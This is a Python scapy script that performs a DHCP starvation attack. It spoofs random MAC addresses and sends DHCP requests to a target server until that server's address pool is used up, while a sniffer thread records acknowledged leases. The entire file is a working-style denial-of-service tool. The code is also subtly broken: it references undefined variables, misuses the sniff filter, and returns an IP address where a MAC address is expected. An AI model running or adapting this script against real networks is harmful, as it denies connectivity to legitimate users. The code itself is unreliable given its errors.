from argparse import ArgumentParser
from scapy.all import *
from threading import Thread


size_of_subnet = 50  # Amount of addresses we need to take up and starve
set_of_starved_IP = set()  # This way we can't add IP's that are already used
used_src_MAC_addr_list = []


def trans_IP_to_MAC(ip, iface):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', pdst=ip_addrs)
    response_packet = srp1(packet, iface=iface)
    if response_packet == None:
        print("Error with translation to MAC")
        exit(1)
    return response[ARP].psrc


def has_DHCP(packet):
    return DHCP in packet


def add_DHCP_acks(packet):
    if ("message-type","ack") in pkt[DHCP].options:  # Meaning this is an ack (We put an in instead of equals in case there is another option)
        set_of_starved_IP.add(packet[IP].dst)


def sniffer(iface):
    sniff(filter=has_DHCP, prn=add_DHCP_acks, iface=iface)


def main():
    parser = ArgumentParser(description="DHCP Starvation")
    parser.add_argument("-i", "--iface", type=str, help="Interface you wish to use")
    parser.add_argument("-t", "--target", type=str, required=True, help="IP of target server")
    args = parser.parse_args()
    target_MAC = trans_IP_to_MAC(args.target, args.iface)
    sniff_thread = Thread(target=sniffer, args=(args.iface,))  # Passing in the sniffer function and a tuple of args which contains the iface
    thread.Start()
    while len(set_of_starved_IP) <= size_of_subnet:  # While we still have IPs to starve
        address_prefix = "192.168.0."
        for last_octet in range(150, 200):
            src_IP = address_prefix + str(last_octet)
            if src_IP in set_of_starved_IP:
                continue
            src_MAC = RandMAC()                      #--|
            while src_MAC in used_src_MAC_addr_list: #  |--> Just going to explain the purpose of this loop.
                src_MAC = RandMAC()                  #--|    We want a completely new random MAC that has not yet been used
            used_src_MAC_addr_list.append(src_MAC)
            packet = Ether(dst=target_MAC, src=src_MAC)/IP(src="0.0.0.0", dst=args.target)/UDP(sport=68, dport=67)/BOOTP(chaddr=src_MAC)/DHCP(options=[("message-type","request"),("server_id",args.target),("requested_addr", src_IP),"end"])
            sendp(packet, iface=args.iface)


if __name__ == '__main__':
    main()
